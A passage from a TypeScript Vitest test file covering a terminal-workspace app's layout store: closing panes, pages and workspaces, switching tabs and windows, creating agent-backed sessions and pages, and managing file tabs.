      return [{ id: "s-live", cwd: "/ws", status: "idle", restored: false, interrupted: false, orphan: null, failureReason: null }];
    });

    await reconcileLayoutSessions();

    expect(get(layoutState).workspaces[0].pages[0].layout).toMatchObject({
      tabs: ["s-live", "s-brand-new"],
    });
  });

  // Clearing every tab in the app over a transient IPC failure would be
  // far worse than leaving a stale one.
  it("changes nothing when the read fails", async () => {
    setState([pageWith(["s-live", "ghost"])], "ws-1", "s-live");
    vi.mocked(backend.getSessionBaselines).mockRejectedValue(new Error("nope"));

    await reconcileLayoutSessions();

    expect(get(layoutState).workspaces[0].pages[0].layout).toMatchObject({
      tabs: ["s-live", "ghost"],
    });
  });
});

describe("closePane", () => {
  it("closes every tab in the pane, killing each session, and always persists", async () => {
    setState(
      [
        ws("ws-1", [
          page(
            "page-1",
            {
              type: "split",
              direction: "row",
              sizes: [0.5, 0.5],
              children: [leaf(["a", "b"], 1), leaf(["c"])],
            }
          ),
        ]),
      ],
      "ws-1",
      "b"
    );
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closePane("b");

    expect(backend.killSession).toHaveBeenCalledWith("a");
    expect(backend.killSession).toHaveBeenCalledWith("b");
    expect(backend.killSession).not.toHaveBeenCalledWith("c");
    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["c"]));
    expect(backend.setWorkspacesState).toHaveBeenCalledWith(state.workspaces, "ws-1", []);
  });

  it("removes the page (not just clears it) when closing its only pane, and still persists", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closePane("a");

    const state = get(layoutState);
    expect(state.workspaces).toEqual([ws("ws-1", [], null)]);
    expect(backend.setWorkspacesState).toHaveBeenCalledWith(state.workspaces, "ws-1", []);
  });

  it("does not throw and does not mutate state when the session id isn't found", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    await expect(closePane("missing")).resolves.toBeUndefined();

    expect(backend.killSession).not.toHaveBeenCalled();
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });
});

describe("switchToTab", () => {
  it("updates activeTabIndex within the active page and persists", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "a");

    await switchToTab("b");

    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a", "b"], 1));
    expect(state.focusedSessionId).toBe("b");
  });
});

describe("switchToSessionInPage", () => {
  it("switches workspace and page, and makes the target session the active tab and focus", async () => {
    const treeA = leaf(["a1", "a2"]);
    const treeB = leaf(["b1"]);
    setState(
      [ws("ws-1", [page("page-a", treeA), page("page-b", treeB)], "page-a")],
      "ws-1",
      "a1"
    );
    await switchToSessionInPage("ws-1", "page-a", "a2");
    const state = get(layoutState);
    expect(state.activeWorkspaceId).toBe("ws-1");
    expect(state.focusedSessionId).toBe("a2");
    const pageA = state.workspaces[0].pages.find((p) => p.id === "page-a");
    expect(pageA?.layout).toEqual(leaf(["a1", "a2"], 1));
    expect(pageA?.focusedSessionId).toBe("a2");
  });

  it("switches to a different page's own tab when the target session lives there", async () => {
    const treeA = leaf(["a1"]);
    const treeB = leaf(["b1", "b2"]);
    setState(
      [ws("ws-1", [page("page-a", treeA), page("page-b", treeB)], "page-a")],
      "ws-1",
      "a1"
    );
    await switchToSessionInPage("ws-1", "page-b", "b2");
    const state = get(layoutState);
    const wsAfter = state.workspaces[0];
    expect(wsAfter.activePageId).toBe("page-b");
    expect(state.focusedSessionId).toBe("b2");
  });

  it("switches workspace when the target session lives in a different, inactive workspace", async () => {
    setState(
      [
        ws("ws-1", [page("page-a", leaf(["a1"]))], "page-a"),
        ws("ws-2", [page("page-b", leaf(["b1", "b2"]))], "page-b"),
      ],
      "ws-1",
      "a1"
    );
    await switchToSessionInPage("ws-2", "page-b", "b2");
    const state = get(layoutState);
    expect(state.activeWorkspaceId).toBe("ws-2");
    expect(state.focusedSessionId).toBe("b2");
  });

  it("does nothing when the page doesn't exist", async () => {
    setState([ws("ws-1", [page("page-a", leaf(["a1"]))])], "ws-1", "a1");
    await switchToSessionInPage("ws-1", "no-such-page", "a1");
    expect(get(layoutState).focusedSessionId).toBe("a1");
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });

  it("persists the updated workspaces state", async () => {
    setState([ws("ws-1", [page("page-a", leaf(["a1", "a2"]))])], "ws-1", "a1");
    await switchToSessionInPage("ws-1", "page-a", "a2");
    expect(backend.setWorkspacesState).toHaveBeenCalled();
  });
});

describe("focusPane", () => {
  it("updates focus without touching workspaces or persisting", () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", null);

    focusPane("a");

    expect(get(layoutState).focusedSessionId).toBe("a");
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });
});

describe("setSessionName", () => {
  it("records a trimmed name and persists it", async () => {
    vi.mocked(backend.setSessionName).mockResolvedValue(undefined);
    await setSessionName("a", "  my project  ");
    expect(get(layoutState).sessionNames).toEqual({ a: "my project" });
    expect(backend.setSessionName).toHaveBeenCalledWith("a", "my project");
  });

  it("clears the name when given a blank string", async () => {
    layoutState.update((s) => ({ ...s, sessionNames: { a: "old name" } }));
    vi.mocked(backend.setSessionName).mockResolvedValue(undefined);
    await setSessionName("a", "   ");
    expect(get(layoutState).sessionNames).toEqual({});
  });
});

describe("createWorkspace", () => {
  it("appends a new workspace, makes it active, and clears focus since the new workspace has no pages yet", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    await createWorkspace("My Project");

    const state = get(layoutState);
    expect(state.workspaces).toHaveLength(2);
    expect(state.workspaces[1].name).toBe("My Project");
    expect(state.activeWorkspaceId).toBe(state.workspaces[1].id);
    expect(state.focusedSessionId).toBeNull();
  });
});

describe("renameWorkspace", () => {
  it("updates only the target workspace's name", async () => {
    setState([ws("ws-1", []), ws("ws-2", [])], "ws-1", null);

    await renameWorkspace("ws-1", "Renamed");

    expect(get(layoutState).workspaces.map((w) => w.name)).toEqual(["Renamed", "ws-2"]);
  });
});

describe("switchWorkspace", () => {
  it("updates activeWorkspaceId and recomputes focusedSessionId", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"]))]), ws("ws-2", [page("page-2", leaf(["x"]))])],
      "ws-1",
      "a"
    );

    await switchWorkspace("ws-2");

    const state = get(layoutState);
    expect(state.activeWorkspaceId).toBe("ws-2");
    expect(state.focusedSessionId).toBe("x");
  });

  it("sets focusedSessionId to null when switching to an empty workspace", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))]), ws("ws-2", [])], "ws-1", "a");

    await switchWorkspace("ws-2");

    const state = get(layoutState);
    expect(state.activeWorkspaceId).toBe("ws-2");
    expect(state.focusedSessionId).toBe(null);
  });

  // The rule this guard exists for: a workspace is on screen in exactly
  // one window. Two panes over one PTY would each report their own
  // cols/rows to the daemon and resize the program between them for as
  // long as both were open. Every path that shows a workspace ends in
  // activateWorkspace, so this one refusal covers all of them.
  it("refuses a workspace another window is showing, and raises that window", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"]))]), ws("ws-2", [page("page-2", leaf(["x"]))])],
      "ws-1",
      "a"
    );
    workspaceWindows.set({ "ws-2": "ws-ws-2" });

    await switchWorkspace("ws-2");

    const state = get(layoutState);
    expect(state.activeWorkspaceId).toBe("ws-1");
    expect(state.focusedSessionId).toBe("a");
    expect(backend.focusWorkspaceWindow).toHaveBeenCalledWith("ws-2");
  });

  // Guarded separately, because switchWorkspaceView does not go through
  // activateWorkspace: `activeView` is stored ON the workspace, so a
  // click here would persist a tab change the other window then adopts --
  // one window silently redrawing another.
  it("refuses to change the tab of a workspace another window is showing", async () => {
    setState([ws("ws-1", []), ws("ws-2", [])], "ws-1", null);
    workspaceWindows.set({ "ws-2": "ws-ws-2" });

    await switchWorkspaceView("ws-2", "kanban");

    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
    expect(backend.focusWorkspaceWindow).toHaveBeenCalledWith("ws-2");
  });
});

describe("handOffWorkspace", () => {
  // Order is the whole of it: look away, give up the terminals, then ask
  // for the window. Any other order has two live panes on one PTY, even
  // briefly.
  it("switches away, drops the terminals it was drawing, then opens the window", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a", "b"]))]), ws("ws-2", [page("page-2", leaf(["x"]))])],
      "ws-1",
      "a"
    );

    await handOffWorkspace("ws-1");

    expect(get(layoutState).activeWorkspaceId).toBe("ws-2");
    expect(terminalRegistry.destroyTerminal).toHaveBeenCalledWith("a");
    expect(terminalRegistry.destroyTerminal).toHaveBeenCalledWith("b");
    expect(terminalRegistry.destroyTerminal).not.toHaveBeenCalledWith("x");
    expect(backend.openWorkspaceWindow).toHaveBeenCalledWith("ws-1");
    // Not killed, not closed: the sessions run on in the daemon and the
    // new window paints them from its screen model.
    expect(backend.killSession).not.toHaveBeenCalled();
  });

  // The main agent sits outside every page tree (D12), so nothing that
  // walks the layout would ever reach it.
  it("gives up the main agent's terminal too", async () => {
    setState([{ ...ws("ws-1", []), mainSessionId: "main-1" }], "ws-1", null);

    await handOffWorkspace("ws-1");

    expect(terminalRegistry.destroyTerminal).toHaveBeenCalledWith("main-1");
  });

  it("opens the hub when the window has nothing else to show", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    await handOffWorkspace("ws-1");

    expect(get(appHubOpen)).toBe(true);
    expect(backend.openWorkspaceWindow).toHaveBeenCalledWith("ws-1");
    // Module-level store: left up, it is the state every test after this
    // one starts in.
    appHubOpen.set(false);
  });

  // A stale click on a row whose window already exists must not open a
  // second one onto the same workspace.
  it("raises the existing window instead of opening a second one", async () => {
    setState([ws("ws-1", []), ws("ws-2", [])], "ws-1", null);
    workspaceWindows.set({ "ws-2": "ws-ws-2" });

    await handOffWorkspace("ws-2");

    expect(backend.focusWorkspaceWindow).toHaveBeenCalledWith("ws-2");
    expect(backend.openWorkspaceWindow).not.toHaveBeenCalled();
  });
});

describe("the app hub", () => {
  it("starts closed", () => {
    expect(get(appHubOpen)).toBe(false);
  });

  it("stamps the workspace it switches to as last used", async () => {
    setState([ws("ws-1", []), ws("ws-2", [])], "ws-1", null);
    const before = Date.now();

    await switchWorkspace("ws-2");

    const stamped = get(layoutState).workspaces.find((w) => w.id === "ws-2")?.lastActiveAt ?? 0;
    expect(stamped).toBeGreaterThanOrEqual(before);
    expect(get(layoutState).workspaces.find((w) => w.id === "ws-1")?.lastActiveAt).toBeUndefined();
  });

  it("closes when a workspace is switched to", async () => {
    setState([ws("ws-1", []), ws("ws-2", [])], "ws-1", null);
    openAppHub();

    await switchWorkspace("ws-2");

    expect(get(appHubOpen)).toBe(false);
  });

  it("closes when the workspace switched to is the one already active", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    openAppHub();

    await switchWorkspace("ws-1");

    expect(get(appHubOpen)).toBe(false);
  });

  it("closes when a page is chosen", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"])), page("page-2", leaf(["b"]))])], "ws-1", "a");
    openAppHub();

    await switchPage("ws-1", "page-2");

    expect(get(appHubOpen)).toBe(false);
  });

  it("closes when a hub view is chosen", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    openAppHub();

    await switchWorkspaceView("ws-1", "kanban");

    expect(get(appHubOpen)).toBe(false);
  });

  it("closes when a workspace is created, so the hub lands you in what it made", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    openAppHub();

    await createWorkspace("Fresh");

    expect(get(appHubOpen)).toBe(false);
  });
});

describe("switchWorkspaceView", () => {
  it("persists the new activeView for the given workspace", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    await switchWorkspaceView("ws-1", "kanban");

    const state = get(layoutState);
    expect(getActiveView(state.workspaces[0])).toBe("kanban");
    expect(backend.setWorkspacesState).toHaveBeenCalled();
  });
});

describe("closeWorkspace", () => {
  it("kills every session across every page, then removes the workspace", async () => {
    setState(
      [
        ws("ws-1", [page("page-1", leaf(["a", "b"])), page("page-2", leaf(["c"]))]),
        ws("ws-2", [page("page-3", leaf(["d"]))]),
      ],
      "ws-1",
      "a"
    );
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeWorkspace("ws-1");

    expect(backend.killSession).toHaveBeenCalledWith("a");
    expect(backend.killSession).toHaveBeenCalledWith("b");
    expect(backend.killSession).toHaveBeenCalledWith("c");
    expect(backend.killSession).not.toHaveBeenCalledWith("d");
    const state = get(layoutState);
    expect(state.workspaces.map((w) => w.id)).toEqual(["ws-2"]);
    expect(state.activeWorkspaceId).toBe("ws-2");
  });

  // The daemon's rows for a workspace are keyed by its uuid and by
  // nothing on disk, so without this record the X makes them
  // permanently unreachable.
  it("leaves a tombstone naming the workspace's root", async () => {
    setState([{ ...ws("ws-1", [page("page-1", leaf(["a"]))]), rootPath: "/repo/one" }], "ws-1", "a");
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeWorkspace("ws-1");

    const [tombstone, ...rest] = get(layoutState).removedWorkspaces;
    expect(rest).toEqual([]);
    expect(tombstone).toMatchObject({ id: "ws-1", rootPath: "/repo/one" });
    // Persisted with the workspaces, not left in memory only.
    expect(vi.mocked(backend.setWorkspacesState).mock.calls.at(-1)?.[2]).toEqual([tombstone]);
  });

  it("leaves no tombstone for a workspace that was never bound to a root", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeWorkspace("ws-1");

    expect(get(layoutState).removedWorkspaces).toEqual([]);
  });

  // The X is app-side and nothing else: it used to delete the board,
  // which made closing a workspace destroy columns and labels with no
  // warning that said so. Deleting data is the wizard's job now.
  it("leaves the workspace's kanban board alone", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeWorkspace("ws-1");

    expect(backend.deleteBoard).not.toHaveBeenCalled();
  });
});

describe("createPage", () => {
  it("creates N sessions, builds the tree, appends the page to the given workspace, and makes it active", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    vi.mocked(backend.createSession).mockResolvedValueOnce("a").mockResolvedValueOnce("b");

    await createPage("ws-1", ([x, y]) => ({ type: "split", direction: "row", children: [leaf([x]), leaf([y])], sizes: [0.5, 0.5] }), 2, "Page 1");

    const state = get(layoutState);
    expect(state.workspaces[0].pages).toHaveLength(1);
    expect(state.workspaces[0].pages[0].name).toBe("Page 1");
    expect(state.workspaces[0].activePageId).toBe(state.workspaces[0].pages[0].id);
    expect(state.activeWorkspaceId).toBe("ws-1");
    expect(state.focusedSessionId).toBe("a");
  });

  it("starts every session in the workspace's root directory", async () => {
    setState([ws("ws-1", [], null, "/repos/gavin")], "ws-1", null);
    vi.mocked(backend.createSession).mockResolvedValueOnce("a").mockResolvedValueOnce("b");

    await createPage("ws-1", ([x, y]) => ({ type: "split", direction: "row", children: [leaf([x]), leaf([y])], sizes: [0.5, 0.5] }), 2, "Page 1");

    expect(backend.createSession).toHaveBeenCalledTimes(2);
    expect(vi.mocked(backend.createSession).mock.calls).toEqual([
      ["/repos/gavin", undefined, "/repos/gavin"],
      ["/repos/gavin", undefined, "/repos/gavin"],
    ]);
  });

  it("leaves the cwd unset for a workspace with no root, so the daemon picks $HOME", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    vi.mocked(backend.createSession).mockResolvedValue("a");

    await createPage("ws-1", ([x]) => leaf([x]), 1, "Page 1");

    expect(backend.createSession).toHaveBeenCalledWith(undefined, undefined, undefined);
  });

  it("is a no-op for an unknown workspace id", async () => {
    setState([ws("ws-1", [])], "ws-1", null);

    await createPage("missing", ([x]) => leaf([x]), 1, "Page 1");

    expect(backend.createSession).not.toHaveBeenCalled();
  });

  it("opens the sessions in an explicit cwd instead of the workspace root", async () => {
    setState([ws("ws-1", [], null, "/repos/gavin")], "ws-1", null);
    vi.mocked(backend.createSession).mockResolvedValue("a");

    await createPage("ws-1", ([x]) => leaf([x]), 1, "backend", { cwd: "/repos/gavin-backend" });

    // An explicit cwd moves where the session RUNS and nothing else: the
    // workspace it belongs to is still ws-1, and the daemon is told so.
    expect(backend.createSession).toHaveBeenCalledWith(
      "/repos/gavin-backend",
      undefined,
      "/repos/gavin"
    );
  });

  // The "New page" dropdown's checkbox. A page of bare shells is still
  // the default: nothing that already calls createPage passes this.
  it("starts every pane on the workspace's agent when asked for one", async () => {
    setState([ws("ws-1", [], null, "/repos/gavin")], "ws-1", null);
    seedAgentConfig("ws-1", { profile: "claude-code", file: null, command: "claude --model opus" });
    vi.mocked(backend.createSession).mockResolvedValueOnce("a").mockResolvedValueOnce("b");

    await createPage("ws-1", ([x, y]) => ({ type: "split", direction: "row", children: [leaf([x]), leaf([y])], sizes: [0.5, 0.5] }), 2, "Page 1", { withAgent: true });

    expect(vi.mocked(backend.createSession).mock.calls).toEqual([
      ["/repos/gavin", "claude --model opus", "/repos/gavin"],
      ["/repos/gavin", "claude --model opus", "/repos/gavin"],
    ]);
  });

  // Without this a broken agent on the new page reads as one that
  // finished -- the same pairing every other launcher makes.
  it("arms failure detection on each of those sessions", async () => {
    setState([ws("ws-1", [], null, "/repos/gavin")], "ws-1", null);
    seedAgentConfig("ws-1", { profile: "claude-code", file: null, command: null });
    agentProfilesStore.set([agentProfile("claude-code", ["API Error:"])]);
    vi.mocked(backend.createSession).mockResolvedValueOnce("a").mockResolvedValueOnce("b");

    await createPage("ws-1", ([x, y]) => ({ type: "split", direction: "row", children: [leaf([x]), leaf([y])], sizes: [0.5, 0.5] }), 2, "Page 1", { withAgent: true });

    expect(vi.mocked(backend.setFailurePatterns).mock.calls).toEqual([
      ["a", ["API Error:"]],
      ["b", ["API Error:"]],
    ]);
  });

  it("leaves the panes as bare shells when no agent was asked for", async () => {
    setState([ws("ws-1", [], null, "/repos/gavin")], "ws-1", null);
    seedAgentConfig("ws-1", { profile: "claude-code", file: null, command: "claude" });
    agentProfilesStore.set([agentProfile("claude-code", ["API Error:"])]);
    vi.mocked(backend.createSession).mockResolvedValue("a");

    await createPage("ws-1", ([x]) => leaf([x]), 1, "Page 1", { withAgent: false });

    expect(backend.createSession).toHaveBeenCalledWith("/repos/gavin", undefined, "/repos/gavin");

    expect(backend.setFailurePatterns).not.toHaveBeenCalled();
  });

  // A rail spawning its own page must not yank the human off whatever
  // they are looking at -- the Orchestration tab they just pressed Start
  // in, usually.
  it("leaves the active page alone when the caller asks not to activate", async () => {
    setState([ws("ws-1", [page("p1", leaf(["s1"]))])], "ws-1", "s1");
    const before = get(layoutState).workspaces[0].activePageId;
    vi.mocked(backend.createSession).mockResolvedValue("a");

    await createPage("ws-1", ([x]) => leaf([x]), 1, "backend", { activate: false });

    const state = get(layoutState);
    expect(state.workspaces[0].pages).toHaveLength(2);
    expect(state.workspaces[0].pages[1].name).toBe("backend");
    expect(state.workspaces[0].activePageId).toBe(before);
    expect(state.focusedSessionId).toBe("s1");
  });
});

// The bug this exists to prevent: a rail's page opened with a blank
// shell of its own, and the agent the page was made FOR arrived beside
// it as tab two -- an idle terminal nobody asked for, first in the strip
// for the life of the page.
describe("createSessionOnNewPage", () => {
  it("makes the session the new page's only tab, with no blank shell ahead of it", async () => {
    setState([ws("ws-1", [page("p1", leaf(["s1"]))], "p1", "/repos/gavin")], "ws-1", "s1");
    vi.mocked(backend.createSession).mockResolvedValue("agent");

    const made = await createSessionOnNewPage("ws-1", "backend", "/repos/wt", "claude", {
      activate: false,
    });

    expect(made).toEqual({ pageId: expect.any(String), sessionId: "agent" });
    // ONE session, carrying the caller's own cwd and command -- not the
    // workspace root, and not a bare shell.
    expect(backend.createSession).toHaveBeenCalledTimes(1);
    // The caller's cwd is a worktree; the workspace root rides alongside
    // it, which is what lets the agent there write this workspace's cards.
    expect(backend.createSession).toHaveBeenCalledWith("/repos/wt", "claude", "/repos/gavin");
    const state = get(layoutState);
    expect(state.workspaces[0].pages).toHaveLength(2);
    expect(state.workspaces[0].pages[1].layout).toEqual(leaf(["agent"]));
    // And the page it was told not to activate stays off the screen.
    expect(state.workspaces[0].activePageId).toBe("p1");
    expect(state.focusedSessionId).toBe("s1");
  });

  // "" and null are how a SessionLink spells "the default" -- a rail's
  // launch carries them straight through.
  it("treats an empty cwd and a null command as unset", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    vi.mocked(backend.createSession).mockResolvedValue("agent");

    await createSessionOnNewPage("ws-1", "backend", "", null);

    expect(backend.createSession).toHaveBeenCalledWith(undefined, undefined, undefined);
  });

  it("is null for an unknown workspace, and starts nothing", async () => {
    setState([ws("ws-1", [])], "ws-1", null);

    expect(await createSessionOnNewPage("missing", "backend", "/x", "claude")).toBeNull();
    expect(backend.createSession).not.toHaveBeenCalled();
  });
});

describe("createSessionForCard", () => {
  it("creates a page and homes the session there when the workspace has zero pages", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    vi.mocked(backend.createSession).mockResolvedValue("s1");

    const sessionId = await createSessionForCard("ws-1", "", null);

    expect(sessionId).toBe("s1");
    const state = get(layoutState);
    expect(state.workspaces[0].pages).toHaveLength(1);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["s1"]));
    expect(state.focusedSessionId).toBe("s1");
  });

  it("adds a tab to the workspace's active page when it already has pages", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.createSession).mockResolvedValue("s1");

    const sessionId = await createSessionForCard("ws-1", "/tmp", "npm test");

    expect(sessionId).toBe("s1");
    const state = get(layoutState);
    expect(state.workspaces[0].pages[0].layout).toEqual(leaf(["a", "s1"], 1));
  });

  it("passes a non-blank cwd/command straight through to backend.createSession", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");
    vi.mocked(backend.createSession).mockResolvedValue("s1");

    await createSessionForCard("ws-1", "/tmp/project", "npm test");

    expect(backend.createSession).toHaveBeenCalledWith("/tmp/project", "npm test", undefined);
  });

  it("converts a blank cwd and a null command to undefined for backend.createSession", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    vi.mocked(backend.createSession).mockResolvedValue("s1");

    await createSessionForCard("ws-1", "", null);

    expect(backend.createSession).toHaveBeenCalledWith(undefined, undefined, undefined);
  });

  it("returns null and surfaces an error when session creation fails", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    vi.mocked(backend.createSession).mockRejectedValue(new Error("daemon unreachable"));

    const sessionId = await createSessionForCard("ws-1", "", null);

    expect(sessionId).toBeNull();
    expect(get(layoutState).status).toBe("error");
  });

  it("is a no-op for an unknown workspace id", async () => {
    setState([ws("ws-1", [])], "ws-1", null);

    const sessionId = await createSessionForCard("missing", "", null);

    expect(sessionId).toBeNull();
    expect(backend.createSession).not.toHaveBeenCalled();
  });
});

describe("openFileInSplit", () => {
  it("splits the anchor's pane with a new file tab and persists both the tree and the file-tab map", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"]))])], "ws-1", "a");

    await openFileInSplit("a", "/tmp/README.md");

    const state = get(layoutState);
    const tree = state.workspaces[0].pages[0].layout;
    expect(tree.type).toBe("split");
    if (tree.type !== "split") throw new Error("expected a split");
    // The anchor keeps its own leaf; the new file tab gets the sibling leaf.
    expect(tree.children[0]).toEqual(leaf(["a"]));
    const newLeaf = tree.children[1];
    if (newLeaf.type !== "leaf") throw new Error("expected a leaf");
    const newTabId = newLeaf.tabs[0];
    expect(state.fileTabsById[newTabId]).toEqual({ path: "/tmp/README.md" });
    expect(backend.setFileTabs).toHaveBeenCalledWith({ [newTabId]: "/tmp/README.md" });
    expect(backend.setWorkspacesState).toHaveBeenCalled();
    // A file tab is never a terminal session.
    expect(backend.createSession).not.toHaveBeenCalled();
  });

  it("is a no-op when there is no active page", async () => {
    setState([ws("ws-1", [])], "ws-1", null);

    await openFileInSplit("a", "/tmp/README.md");

    expect(backend.setFileTabs).not.toHaveBeenCalled();
  });
});

describe("closing file tabs", () => {
  it("closeSession unwatches a file tab instead of killing a session", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "file-1"]))])], "ws-1", "a");
    layoutState.update((s) => ({ ...s, fileTabsById: { "file-1": { path: "/tmp/a.md" } } }));

    await closeSession("file-1");

    expect(backend.killSession).not.toHaveBeenCalled();
    expect(backend.unwatchFileForViewer).toHaveBeenCalledWith("/tmp/a.md");
    expect(get(layoutState).workspaces[0].pages[0].layout).toEqual(leaf(["a"]));
  });

  it("prunes the closed file tab from fileTabsById and persists the smaller map", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "file-1", "file-2"]))])], "ws-1", "a");
    layoutState.update((s) => ({
      ...s,
      fileTabsById: { "file-1": { path: "/tmp/a.md" }, "file-2": { path: "/tmp/b.md" } },
    }));

    await closeSession("file-1");

    // Only the closed one goes; the other file tab is untouched.
    expect(get(layoutState).fileTabsById).toEqual({ "file-2": { path: "/tmp/b.md" } });
    // Persisted too -- otherwise config.json keeps the dead id forever.
    expect(backend.setFileTabs).toHaveBeenCalledWith({ "file-2": "/tmp/b.md" });
  });

  it("does not touch the file-tab map when only terminal sessions close", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "b"]))])], "ws-1", "a");
    layoutState.update((s) => ({ ...s, fileTabsById: { "file-1": { path: "/tmp/a.md" } } }));
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeSession("a");

    expect(backend.setFileTabs).not.toHaveBeenCalled();
    expect(get(layoutState).fileTabsById).toEqual({ "file-1": { path: "/tmp/a.md" } });
  });

  it("closePane kills only the session tabs and unwatches only the file tabs", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "file-1"]))])], "ws-1", "a");
    layoutState.update((s) => ({ ...s, fileTabsById: { "file-1": { path: "/tmp/a.md" } } }));
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closePane("a");

    expect(backend.killSession).toHaveBeenCalledTimes(1);
    expect(backend.killSession).toHaveBeenCalledWith("a");
    expect(backend.unwatchFileForViewer).toHaveBeenCalledWith("/tmp/a.md");
  });

  it("closeWorkspace kills only the session tabs and unwatches only the file tabs", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "file-1"]))])], "ws-1", "a");
    layoutState.update((s) => ({ ...s, fileTabsById: { "file-1": { path: "/tmp/a.md" } } }));
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closeWorkspace("ws-1");

    expect(backend.killSession).toHaveBeenCalledTimes(1);
    expect(backend.killSession).toHaveBeenCalledWith("a");
    expect(backend.unwatchFileForViewer).toHaveBeenCalledWith("/tmp/a.md");
  });

  it("closePage kills only the session tabs and unwatches only the file tabs", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a", "file-1"]))])], "ws-1", "a");
    layoutState.update((s) => ({ ...s, fileTabsById: { "file-1": { path: "/tmp/a.md" } } }));
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closePage("ws-1", "page-1");

    expect(backend.killSession).toHaveBeenCalledTimes(1);
    expect(backend.killSession).toHaveBeenCalledWith("a");
    expect(backend.unwatchFileForViewer).toHaveBeenCalledWith("/tmp/a.md");
  });
});

describe("bootstrap file tab hydration", () => {
  it("hydrates fileTabsById from the backend on bootstrap", async () => {
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({ workspaces: [], activeWorkspaceId: null });
    vi.mocked(backend.getBootstrapError).mockResolvedValue(null);
    vi.mocked(backend.getSessionNames).mockResolvedValue({});
    vi.mocked(backend.getFileTabs).mockResolvedValue({ "tab-1": "/tmp/README.md" });

    await bootstrap();
    await vi.waitFor(() => {
      expect(get(layoutState).fileTabsById["tab-1"]).toEqual({ path: "/tmp/README.md" });
    });

    teardown();
  });
});

describe("renamePage", () => {
  it("updates only the target page's name", async () => {
    setState([ws("ws-1", [page("page-1", leaf(["a"])), page("page-2", leaf(["b"]))])], "ws-1", null);

    await renamePage("ws-1", "page-1", "Renamed");

    expect(get(layoutState).workspaces[0].pages.map((p) => p.name)).toEqual(["Renamed", "page-2"]);
  });
});

describe("switchPage", () => {
  it("updates the target workspace's activePageId and recomputes focusedSessionId", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"])), page("page-2", leaf(["b"]))], "page-1")],
      "ws-1",
      "a"
    );

    await switchPage("ws-1", "page-2");

    const state = get(layoutState);
    expect(state.workspaces[0].activePageId).toBe("page-2");
    expect(state.focusedSessionId).toBe("b");
  });

  it("also activates the target workspace when switching to a page in a different one", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a"]))]), ws("ws-2", [page("page-2", leaf(["b"]))])],
      "ws-1",
      "a"
    );

    await switchPage("ws-2", "page-2");

    const state = get(layoutState);
    expect(state.activeWorkspaceId).toBe("ws-2");
    expect(state.focusedSessionId).toBe("b");
  });
});

describe("closePage", () => {
  it("kills every session in the page, then removes it", async () => {
    setState(
      [ws("ws-1", [page("page-1", leaf(["a", "b"])), page("page-2", leaf(["c"]))], "page-1")],
      "ws-1",
      "a"
    );
    vi.mocked(backend.killSession).mockResolvedValue(undefined);

    await closePage("ws-1", "page-1");

    expect(backend.killSession).toHaveBeenCalledWith("a");
    expect(backend.killSession).toHaveBeenCalledWith("b");
    expect(backend.killSession).not.toHaveBeenCalledWith("c");
    const state = get(layoutState);
    expect(state.workspaces[0].pages.map((p) => p.id)).toEqual(["page-2"]);
  });
});

describe("movePaneOrTab", () => {
  it("moves a whole pane (all its tabs together) to a different page, grafting right", async () => {
    // page-1 has TWO panes: a 2-tab leaf ["a","b"] and a separate 1-tab
